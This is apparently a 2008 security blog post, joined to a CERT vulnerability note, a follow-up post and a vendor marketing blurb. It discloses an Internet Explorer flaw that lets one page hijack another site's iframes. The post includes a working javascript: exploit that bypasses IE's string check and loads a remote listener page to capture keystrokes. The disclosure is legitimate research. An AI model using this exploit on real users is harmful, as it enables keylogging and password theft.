# Ghost Busters

Thu, 15 May 2008 16:26:48 GMTby
[pdp](/members/pdp.html)
> A special guest blogger for this month is Eduardo Vela, also known as sirdarckcat, a security researcher from Mexico. Eduardo has been on the field for a couple of years, mainly focusing on web-app based vulnerabilities, privilege escalation, and IDS/filter evasion. Today, he is a student of computer sciences, does some research on his free time, and works for an important website as a security engineer. These are his words:

There a few conferences that are privately held (invite-only) and their level is commonly very high. One of them is Microsoft's BlueHat conference. BlueHat is an "internal Microsoft event", but they invite a lot of security researchers from around the world. A couple of friends presented in there, and well, apparently it was really fun. Anyway, there was a specific talk that caught our attention, more specifically Manuel Caballero's "A resident in my domain". The description of his talk was really intriguing:

> Do you believe in ghosts? Imagine an invisible script that silently follows you while you surf, even after changing the URL 1,000 times and you are feeling completely safe. Now imagine that the ghost is able to see everything you do, including what you are surfing and what you are typing (passwords included), and even guess your next move.
> No downloading required, no user confirmation, no ActiveX. In other words: no strings attached. We will examine the power of a resident script and the power of a global cross-domain. Also, we will go through the steps of how to find cross-domains and resident scripts.

Apparently, Caballero found a way of capturing keystrokes and window's location. This means that he "at least" has access to modify `document.onkeydown`, and read `window.location`, but if he could modify `document.onkeydown`, that would mean he has access to execute arbitrary code on other's domains context, so that's not it.. because if that was the case, he wouldn't be able to just capture keystrokes, but to UXSS (Universal XSS) the browser.

Anyway, the two things he claims to be able to manipulate can also be manipulated from an off-domain `iframe`. So if there's some way of changing the location of an `iframe`, to any `iframe` we want, then we would be able to capture keystrokes on our own window. So, we now need a way of changing the location of an `iframe`, but first we need to get a reference to the window where the `iframe`s stay, without loosing the script run-time execution. So there are 2 main ways of getting a reference to a window:

```
x=open().window
x=window.opener
```

Both require the user to open a new window and they work exactly the same way. So if you manage to make the user open a new window, then it doesn't matter where the user is navigating to, (if both windows remains open, anyway if the users close them, you can reopen&blur) you have them. So how do we do that? We need to get a reference to the `iframe`s. The ways of doing so are:

```
document.getElementsByTagName("iframe") {doesnt work on cross-domain calls}
window.frames[] {works on cross-domain calls}
```

Now we just need to modify the location. This is trivial, just changing `window.opener.frames[0].location="new location"` shold work. On a recent versions of IE7 and IE8 this method doesn't work. When you try this, the browser will open a new window and by doing so, not modifying the location of the `iframe`.

After doing some tests, the location DOES gets changed when the setted location is not a string. We have hte following options:

```
window.opener.frames[0].location=123;
window.opener.frames[0].location=window;
window.opener.frames[0].location=location;
```

Works fine! But why? Well, apparently IE7&8 have a protection against setting locations by off-domain scripts, and this protection is.. "if the setted location is a string, throw an Error". Not good! We have a lot of ways of making a `String` to look like an `Object`. For [example](https://chatbotkit.com/examples).

```
new String("some-string");
{toString:function(){return "some-string";}}
new function(){this.toString=function(){return "some-string";}}
```

This way, we bypass IE's protection and set our desired location without any problems. And the final exploit goes like this:

```
javascript:x=open('http://hackademix.net/');setInterval(function(){try{x.frames[0].location={toString:function(){return 'http://www.sirdarckcat.net/caballero-listener.html';}}}catch(e){}},5000);void(1);
```

What caballero-listener does is just focusing itself, so it can catches `onkeydown` events.. there are a lot of ways of making the same thing in more stealth mode.

![Rewind](//gravatar.com/avatar/1be0cc81b33722a9bb3dd64ab7011461?s=256&d=retro)RewindI have thought about something of the kind (using onkeydown). My idea was to create a page which set web browser fullscreen, for hiding the real address bar, and remake it with an input balise. After that, you can control what you want, can't you ?![fazed](//gravatar.com/avatar/9bac8baa8ae20d56ec0320a2f2c33c82?s=256&d=retro)fazednice work :)![echoHI](//gravatar.com/avatar/f562ffe3ce026981f54a75d0364328b3?s=256&d=retro)echoHIcool:) I will try to do the further work.![fragge](//gravatar.com/avatar/3279b01e2d7bc17250897f4c3b47d27d?s=256&d=retro)fraggeExcellent post Eduardo ;) keylogging script from a hyperlink! wow.![.mario](//gravatar.com/avatar/89886495b27cfdc78593e1f5c8810594?s=256&d=retro).marioAwesome research and very good writeup, SDC.

I do believe I read about this presentation on some other website, but no proof of concept was attached at the time. Nice work.![pdp](//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&d=retro)pdpyes, excellent research and very interesting indeed.

I dont think so.. but an interesting discovery, revealed that this one can also make stuff cross-domain ;)

## Microsoft Internet Explorer fails to properly restrict access to frames

#### Vulnerability Note VU#516627

Original Release Date: 2008-06-27 | Last Revised: 2008-07-15

---

### Overview

Microsoft Internet Explorer fails to properly restrict access to a document's frames, which may allow an attacker to modify the contents of frames in a different domain.

### Description

| [Frames](http://www.w3.org/TR/REC-html40/present/frames.html) in HTML documents are subdivisions of the current window. The most common use of frames in web pages is the [IFRAME](http://www.w3.org/TR/REC-html40/present/frames.html#h-16.5), or inline frame. IFRAMEs can be used to display content from a different domain within the physical representation of the current web page. A common example of the use of an IFRAME in a web page is to display a banner advertisement from a third party.  Microsoft Internet Explorer fails to properly restrict access to a document's frames. This can allow an attacker to replace the contents of a web page's frame with arbitrary content. Internet Explorer still appears to enforce the cross-domain security model, which limits the actions that a malicious frame can take with the parent document. For example, a frame that exists in a different domain should not be able to access the parent document's cookies or HTML content, or other domain-specific DOM components. However, components that are not tied to a specific domain, such as the [onmousedown](http://msdn.microsoft.com/en-us/library/ms536944%28VS.85%29.aspx) event can be accessed. By monitoring this particular event, an IFRAME can capture keystrokes from the parent document. Other actions may be possible.  Limited testing has shown that Internet Explorer 6, 7, and 8 beta 1 are vulnerable. Proof-of-concept code for this vulnerability is publicly available. |
| --- |

### Impact

| By convincing a user to view a specially crafted HTML document (e.g., a web page or an HTML email message), an attacker may be able to access non-domain-specific elements from a web page that exists in a different domain. For example, the attacker may be able to capture keystrokes while a user is interacting with a web page in a different domain. |
| --- |

### Solution

| We are currently unaware of a practical solution to this problem. Please consider the following workarounds: |
| --- |

| **Disable Active Scripting**This vulnerability can be mitigated by disabling Active Scripting in the Internet Zone, as specified in the "[Securing Your Web Browser](http://www.us-cert.gov/reading_room/securing_browser/#Internet_Explorer)" document. |

### [Ghosts for IE8 and IE7.5730](http://sirdarckcat.blogspot.com/2008/05/ghosts-for-ie8-and-ie75730.html)

Here's a new version of the last post code for hijacking IE6 and IE7 iframes.

Aparently some versions of IE where fixed, (the code didnt worked for 40% of the people), so after downloading the newest IE7, I kept researching and found another issue.

Sample PoC Here.

This time the code will open a new window (hackademix.net), it will hijack one of the iframes, and capture keystrokes.

It's the same idea as last time, but bypassing a weird protection.

Greetz!!

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
